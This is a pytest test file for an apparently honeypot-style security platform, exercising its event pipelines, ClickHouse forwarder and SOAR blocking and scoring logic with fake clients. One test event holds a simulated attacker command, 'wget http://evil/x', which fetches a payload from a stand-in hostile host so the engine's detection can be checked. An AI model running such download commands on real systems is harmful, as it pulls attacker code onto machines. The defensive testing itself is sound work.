"""Cover pipeline transport branches and SOAR scoring/blocking edges."""

from __future__ import annotations

import asyncio
import json
import sys
import types

import pytest

import cloudsentinel.pipeline as pipeline_module
import cloudsentinel.soar as soar_module
from cloudsentinel.config import load_settings
from cloudsentinel.pipeline import EventEnvelope, EventPipeline, LocalWAL
from cloudsentinel.soar import SOAREngine, SOARScheduler


class FakeRedis:
    def __init__(self) -> None:
        self.xadds: list = []
        self.published: list = []
        self.closed = False

    async def ping(self) -> bool:
        return True

    async def xadd(self, _stream: str, fields: dict, **_kwargs: object) -> str:
        self.xadds.append(fields)
        return "1-0"

    async def aclose(self) -> None:
        self.closed = True


class FakeNats:
    async def publish(self, _subject: str, _payload: bytes) -> None:
        return None

    async def drain(self) -> None:
        return None


class FakeKafka:
    async def start(self) -> None:
        return None

    async def send_and_wait(self, _topic: str, _payload: bytes) -> None:
        return None

    async def stop(self) -> None:
        return None


def test_local_wal_invalid_lines(tmp_path) -> None:
    wal = LocalWAL(tmp_path / "events.wal")
    asyncio.run(wal.write(EventEnvelope("e", "s", "8.8.8.8", 1, 1.0, {})))
    with open(wal.path, "a", encoding="utf-8") as handle:
        handle.write("not-json\n")
    events = asyncio.run(wal.read_and_clear())
    assert len(events) == 1
    assert asyncio.run(wal.read_and_clear()) == []


@pytest.mark.asyncio
async def test_event_pipeline_transports(monkeypatch) -> None:
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    fake_redis = FakeRedis()
    monkeypatch.setattr(pipeline_module.redis, "from_url", lambda *_a, **_k: fake_redis)

    nats_module = types.ModuleType("nats")

    async def fake_connect(_url: str) -> FakeNats:
        return FakeNats()

    nats_module.connect = fake_connect
    monkeypatch.setitem(sys.modules, "nats", nats_module)

    kafka_module = types.ModuleType("aiokafka")
    kafka_module.AIOKafkaProducer = lambda **_kwargs: FakeKafka()
    monkeypatch.setitem(sys.modules, "aiokafka", kafka_module)

    settings.nats.enabled = True
    settings.kafka.enabled = True
    pipeline = EventPipeline(settings.redis, settings.nats, settings.kafka)
    await pipeline.start()
    envelope = EventEnvelope("e", "session", "8.8.8.8", 22, 1.0, {"eventid": "e"})
    await pipeline.emit(envelope)
    assert fake_redis.xadds
    await pipeline.stop()
    assert fake_redis.closed

    settings.nats.enabled = True
    settings.kafka.enabled = True
    failing_nats = types.ModuleType("nats")

    async def fail_connect(_url: str) -> FakeNats:
        raise RuntimeError("nats down")

    failing_nats.connect = fail_connect
    monkeypatch.setitem(sys.modules, "nats", failing_nats)
    failing_kafka = types.ModuleType("aiokafka")

    class BrokenKafka:
        def __init__(self, **_kwargs: object) -> None:
            return None

        async def start(self) -> None:
            raise RuntimeError("kafka down")

    failing_kafka.AIOKafkaProducer = BrokenKafka
    monkeypatch.setitem(sys.modules, "aiokafka", failing_kafka)
    fake_redis2 = FakeRedis()
    monkeypatch.setattr(pipeline_module.redis, "from_url", lambda *_a, **_k: fake_redis2)
    degraded = EventPipeline(settings.redis, settings.nats, settings.kafka)
    await degraded.start()
    await degraded.stop()

    broken = EventPipeline(settings.redis, settings.nats, settings.kafka)

    async def stop_fail() -> None:
        raise RuntimeError("stop failed")

    monkeypatch.setattr(broken, "stop", stop_fail)
    assert await broken.reconnect() is False


@pytest.mark.asyncio
async def test_forwarder_failure_paths(monkeypatch, tmp_path) -> None:
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.clickhouse.enabled = True
    forwarder = pipeline_module.ClickHouseForwarder(settings.redis, settings.clickhouse)
    forwarder._spill_path = tmp_path / "spill.jsonl"
    envelope = EventEnvelope("e", "spill", "8.8.8.8", 22, 1.0, {"eventid": "e"})
    forwarder._spill_path.write_text(
        json.dumps(envelope.to_redis_fields()) + "\nnot-json\n",
        encoding="utf-8",
    )

    class BrokenClient:
        def insert(self, *_args: object, **_kwargs: object) -> None:
            raise RuntimeError("insert failed")

        def close(self) -> None:
            return None

    forwarder._client = BrokenClient()
    await forwarder._flush_spill()
    assert forwarder._spill_path.exists()
    forwarder._spill_clear()
    forwarder._spill_clear()
    assert not forwarder._spill_path.exists()

    class BrokenRedis:
        async def xread(self, *_args: object, **_kwargs: object) -> list:
            forwarder._stopped.set()
            raise RuntimeError("redis failed")

    forwarder._redis = BrokenRedis()  # type: ignore[assignment]
    forwarder._stopped.clear()
    async def no_sleep(_seconds: float) -> None:
        return None
    monkeypatch.setattr(pipeline_module.asyncio, "sleep", no_sleep)
    await forwarder._run()


@pytest.mark.asyncio
async def test_soar_start_and_helpers(monkeypatch) -> None:
    engine = SOAREngine(allowlist=["bad-entry", "10.0.0.0/8"])
    assert engine.is_allowlisted("bad-ip") is False
    assert engine.is_allowlisted("10.1.2.3") is True
    assert engine.mttb == 0.0
    engine._block_timings = [0.1, 0.2]
    assert engine.mttb > 0
    assert engine.get_ip_profile("missing")["ip"] == "missing"

    class BrokenRedisFactory:
        @staticmethod
        def from_url(*_args: object, **_kwargs: object) -> object:
            raise RuntimeError("redis down")

    monkeypatch.setattr(soar_module.aioredis, "from_url", BrokenRedisFactory.from_url)
    with_redis = SOAREngine(redis_settings=types.SimpleNamespace(url="redis://unit"))
    await with_redis.start()
    assert with_redis._redis is None

    class FakeSoarRedis:
        def __init__(self) -> None:
            self.deleted: list = []
            self.set_calls: list = []

        async def get(self, _key: str) -> str:
            return "3"

        async def incr(self, _key: str) -> int:
            return 4

        async def set(self, *args: object, **kwargs: object) -> None:
            self.set_calls.append((args, kwargs))

        async def expire(self, *_args: object, **_kwargs: object) -> None:
            return None

        async def delete(self, *_keys: str) -> None:
            self.deleted.append(_keys)

        async def exists(self, _key: str) -> int:
            return 0

        async def aclose(self) -> None:
            return None

    fake = FakeSoarRedis()
    redis_engine = SOAREngine(redis_settings=types.SimpleNamespace(url="redis://unit"))
    redis_engine._redis = fake  # type: ignore[assignment]
    assert await redis_engine._get_failed_auth("s") == 3
    assert await redis_engine._incr_failed_auth("s") == 4
    await redis_engine._clear_failed_auth("s")
    await redis_engine._mark_blocked("8.8.8.8")
    assert fake.deleted
    assert fake.set_calls
    assert await redis_engine._is_blocked("8.8.8.8") is False


@pytest.mark.asyncio
async def test_soar_scoring_and_scheduler(monkeypatch) -> None:
    monkeypatch.setattr(soar_module, "_MISP_AVAILABLE", True)
    monkeypatch.setattr(soar_module, "_ABUSEIPDB_AVAILABLE", True)

    class FakeMisp:
        def is_malicious_ip(self, _ip: str) -> bool:
            return True

    class FakeAbuse:
        async def check(self, _ip: str) -> dict:
            return {"abuse_confidence_score": 100, "total_reports": 200}

        def soar_bonus(self, _report: dict) -> int:
            return 30

    monkeypatch.setattr(soar_module, "_get_misp", lambda: FakeMisp())
    monkeypatch.setattr(soar_module, "_get_abuseipdb", lambda: FakeAbuse())
    engine = SOAREngine(risk_threshold=1000, firewall_enabled=False)
    event = await engine.process_event(
        "s",
        {
            "eventid": "cloudsentinel.command.input",
            "src_ip": "8.8.8.8",
            "input": "wget http://evil/x",
            "cloudsentinel_risk_score": 10,
        },
    )
    assert event["cloudsentinel_mitre_techniques"]
    closed = await engine.process_event(
        "s",
        {"eventid": "cloudsentinel.session.closed", "src_ip": "8.8.8.8"},
    )
    assert closed["cloudsentinel_soar_action"] == "none"

    failing = SOAREngine(firewall_enabled=True, firewall_dry_run=False)
    failing._redis = None

    async def failed_rule(_args: list[str], _event: dict) -> tuple[int, str, str]:
        return 1, "", ""

    monkeypatch.setattr(failing, "_run_firewall", failed_rule)
    assert await failing._block_ip({"src_ip": "8.8.8.8"}) == "block_failed"

    scheduler = SOARScheduler()

    async def bad_unblock(_ip: str) -> None:
        scheduler.stop()
        raise RuntimeError("unblock failed")

    async def bad_cron() -> None:
        raise RuntimeError("cron failed")

    scheduler.add_ttl_unblock("8.8.8.8", 0, bad_unblock)
    scheduler._tasks.append(
        {
            "type": "cron",
            "name": "bad",
            "next_run": 0,
            "cron": types.SimpleNamespace(get_next=lambda _type: 0),
            "callback": bad_cron,
        }
    )
    await scheduler.start(check_interval=0)
